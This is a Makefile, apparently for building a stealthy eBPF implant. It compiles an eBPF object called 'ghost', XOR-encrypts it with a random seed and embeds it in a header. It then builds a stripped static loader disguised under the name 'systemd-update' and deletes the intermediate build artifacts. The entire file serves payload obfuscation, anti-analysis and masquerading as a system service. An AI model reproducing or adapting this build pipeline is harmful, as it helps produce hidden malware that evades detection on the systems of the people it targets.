CC = clang
SEED = $(shell head -c 4 /dev/urandom | xxd -p)
# Added -lelf for guaranteed ELF parsing
CFLAGS = -O3 -Wall -DSEED_VAL=0x$(SEED) -lelf -static

all: prep xor_tool bpf header loader clean_tmp

prep:
	@mkdir -p target

xor_tool:
	gcc build/xor.c -o build/xor_tool

bpf:
	$(CC) -O3 -target bpf -g -c src/bpf/ghost.c -o target/ghost.o
	llvm-strip --strip-unneeded -R .comment target/ghost.o
	./build/xor_tool target/ghost.o 0x$(SEED)

header:
	cd target && xxd -i ghost.o > ../src/ghost_blob.h

loader:
	$(CC) src/loader.c $(CFLAGS) -o target/systemd-update
	strip -s target/systemd-update

clean_tmp:
	rm -f build/xor_tool src/ghost_blob.h target/ghost.o

clean:
	rm -rf target/ build/xor_tool
